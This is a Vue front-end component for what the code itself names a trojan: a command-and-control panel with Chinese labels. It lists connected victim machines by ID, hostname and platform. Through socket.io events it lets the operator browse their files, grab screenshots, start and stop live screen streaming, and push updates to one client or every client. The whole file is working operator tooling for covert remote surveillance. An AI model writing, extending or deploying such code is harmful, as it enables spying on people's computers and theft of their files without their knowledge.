<template>
  <div
    id="trojan"
    style="display: flex; flex-direction: column; align-items: center"
  >
    <p :style="status_style">{{ server_status }}</p>
    <div>
      <button @click="updateAllClients">更新所有客户端</button>
      <button @click="toggleVideoCapture">停止推流</button>
    </div>
    <img
      id="screenshot"
      v-if="screenshot.src"
      :src="screenshot.src"
      @click="scaleTrigger"
      @contextmenu="clearImg"
      @touchstart="longPressClearImg"
      @touchmove="clearTimeout(touchTimeout)"
      @touchend="clearTimeout(touchTimeout)"
      :style="screenshotStyle"
    />
    <div id="ClientGroup">
      <template v-for="i in clientArr" :key="i.id">
        <div
          :class="{ client: true, streaming: i.streaming }"
          @click="toControlPage(i.id)"
          @contextmenu="showContextMenu(event, i.id)"
          @touchstart="longPressShowContextMenu(i.id)"
          @touchmove="
            clearTimeout(touchTimeout);
            touchTimeout = 0;
          "
          @touchend="
            clearTimeout(touchTimeout);
            touchTimeout = 0;
          "
        >
          <p>ID: {{ i.id }}</p>
          <p>主机名: {{ i.hostname }}</p>
          <p>平台: {{ i.version }}</p>
        </div>
      </template>
      <p v-show="!clientArr.length">列表为空</p>
    </div>
    <context-menu
      :contextMenu="$store.state.contextMenu"
      :msg="msg"
      :template="contextMenu.template"
    ></context-menu>
  </div>
</template>

<script>
// const { ipcRenderer } = window.require("electron");
import sio from "socket.io-client";
import ss from "socket.io-stream";
import { SERVER_ADDRESS, SERVER_PORT } from "../../../my_config";
import ContextMenuVue from "../../components/ContextMenu.vue";
export default {
  data() {
    return {
      clientArr: [],
      selectedId: "",
      interval: null,
      touchTimeout: 0,
      // server_status: window.server_status,
      server_status: "未连接",
      newBackendName: "backend",
      screenshot: {
        enlarge: false,
        src: "",
      },
      contextMenu: {
        template: [
          {
            label: "显示此客户端详细信息",
            click: () => {
              for (let i = 0; i < window.clientArr.length; i++) {
                if (window.clientArr[i].id === this.msg.id) {
                  let str = "";
                  for (let item in window.clientArr[i]) {
                    str += `${item}: ${window.clientArr[i][item]}\n`;
                    // console.log(`${item}: ${window.clientArr[i][item]}`);
                  }
                  alert(str);
                  break;
                }
              }
              // alert(1);
            },
          },
          {
            label: "打开文件浏览器",
            click: () => {
              let that = this;
              console.log(this.msg.id);
              window.io.emit("apilistdir", that.msg.id, ".");
              that.$router.push({
                path: `/trojan/fileexplorer`,
                query: {
                  id: that.msg.id,
                },
              });
            },
          },
          {
            label: "获取此客户端屏幕截图",
            click: () => {
              window.io.emit("apigetscreenshot", this.msg.id);
            },
          },
          {
            label: "开启此客户端屏幕推流",
            click: () => {
              window.io.emit("apistartvideocapture", this.msg.id);
            },
          },
          // { type: "separator" },
          {
            label: "更新此客户端",
            click: () => {
              window.io.emit("apiupdatethisclient", this.msg.id, "backend");
            },
          },
          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
        show: false,
        mousePos: {
          screenX: 0,
          screenY: 0,
          clientX: 0,
          clientY: 0,
        },
      },
      msg: {},
    };
  },
  computed: {
    ca() {
      return this.$store.getters.getClientArr;
    },
    screenshotStyle() {
      return this.screenshot.enlarge
        ? {
            position: "fixed",
            left: "30px",
            top: "30px",
            height: "90vh",
            width: "90vw",
          }
        : {};
    },
    status_style() {
      let tmp = {};
      switch (this.server_status) {
        case "已连接": {
          tmp = { color: "green" };
          break;
        }
        case "未连接":
        case "已断开": {
          tmp = { color: "red" };
        }
      }
      return tmp;
    },
  },
  watch: {},
  beforeMount() {
    document.documentElement.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });
    let that = this;
    window.clientArr = [];
    window.cmdResult = {
      data: "",
    };
    window.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
      // withCredentials: true,
    });
    window.ss = ss;
    window.server_status = "未连接";

    window.io.on("connect", () => {
      window.io.send({ admin: true });
      window.server_status = "已连接";
    });

    window.io.on("disconnect", () => {
      window.server_status = "已断开";
    });

    window.io.on("apigetallclients", (carr) => {
      window.clientArr = carr;
      window.server_status = "已连接";
    });

    window.io.on("apisendcmd", (cmdresult) => {
      window.cmdResult = cmdresult;
      console.log(cmdresult);
    });

    window.io.on("apigetscreenshot", (imgbase64) => {
      window.screenshot = `data:image/jpg;base64,${imgbase64}`;
      console.log(typeof imgbase64);
      console.log(imgbase64);
      // ipcRenderer.send("showScreenshotWindow", imgbase64);
    });

    window.io.on("debug", (msg) => {
      console.log(`--DEBUG:\n${msg}`);
    });

    this.interval = setInterval(() => {
      //!!
      window.io.emit("apigetallclients");

      that.clientArr = window.clientArr;
      that.server_status = window.server_status;
      that.screenshot.src = window.screenshot;
      that.$forceUpdate();
    }, 1000);

    // ipcRenderer.on("showFileExplorer", (e, id) => {
    //   window.io.emit("apilistdir", id, ".");
    //   that.$router.push({
    //     path: `/trojan/fileexplorer`,
    //     query: {
    //       id: id,
    //     },
    //   });
    // });
    // ipcRenderer.on("startVideoCapture", (e, id) => {
    //   window.io.emit("apistartvideocapture", id);
    // });
  },
  methods: {
    toControlPage(id) {
      // console.log("click", id);
      this.$router.push("/trojan/control/" + id);
    },
    showContextMenu(event, id) {
      // window.ipcRenderer.send("show-context-menu", {
      //   id: id,
      //   newBackendName: this.newBackendName,
      // });

      event = event || window.event;
      this.$emit("show-context-menu", {
        screenX: event.screenX,
        screenY: event.screenY,
      });

      // this.$store.state.contextMenu.show = !this.$store.state.contextMenu.show;
      this.$store.state.contextMenu.show = true;
      this.$store.state.contextMenu.mousePos.screenX = event.screenX;
      this.$store.state.contextMenu.mousePos.screenY = event.screenY;
      this.$store.state.contextMenu.mousePos.clientX = event.clientX;
      this.$store.state.contextMenu.mousePos.clientY = event.clientY;
      this.msg.id = id;
    },
    longPressShowContextMenu(id) {
      const that = this;
      that.touchTimeout = setTimeout(() => {
        that.touchTimeout = 0;
        that.showContextMenu(id);
      }, 1500);
    },
    updateAllClients() {
      window.io.emit("apiupdateallclients", this.newBackendName);
    },
    scaleTrigger() {
      this.screenshot.enlarge = !this.screenshot.enlarge;
    },
    clearImg() {
      // this.screenshot.src = "";
      window.screenshot = "";
      this.screenshot.enlarge = false;
    },
    longPressClearImg() {
      const that = this;
      that.touchTimeout = setTimeout(() => {
        that.clearImg();
      }, 700);
    },
    toggleVideoCapture() {
      for (const item of window.clientArr) {
        if (item["streaming"]) {
          window.io.emit("apistopvideocapture", item["id"]);
        }
      }
    },
  },
  components: {
    "context-menu": ContextMenuVue,
  },
};
</script>

<style lang="less">
#trojan {
  overflow: auto;
}
#screenshot {
  width: 30vw;
  height: 30vh;
  transition: 0.3s;
  border: 1px solid black;
}
#ClientGroup {
  display: flex;
  flex-direction: row;
  overflow: auto;
  height: 65vh;
  // height: 400px;
  // height: 80%;
  padding-top: 10px;
  width: 100vw;
  box-sizing: border-box;
  padding: 5px 2% 0 2%;
  flex-wrap: wrap;
  align-items: flex-start;
  justify-content: space-between;

  .client {
    box-sizing: border-box;
    padding: 2%;
    border: 1px solid black;
    display: flex;
    flex-direction: column;
    justify-content: left;
    // margin: 0 1% 10px 1%;
    margin-bottom: 2%;
    text-align: left;
    // width: 46vw;
    width: 49%;

    p {
      // user-select: none;
    }

    &:hover {
      box-shadow: 0px 5px 10px gray;
      cursor: pointer;
      transition: 0.2s;
    }
  }
}

.streaming {
  animation: streaming infinite alternate 1.5s;
}

@keyframes streaming {
  from {
  }
  to {
    background-color: rgb(197, 231, 197);
  }
}
</style>
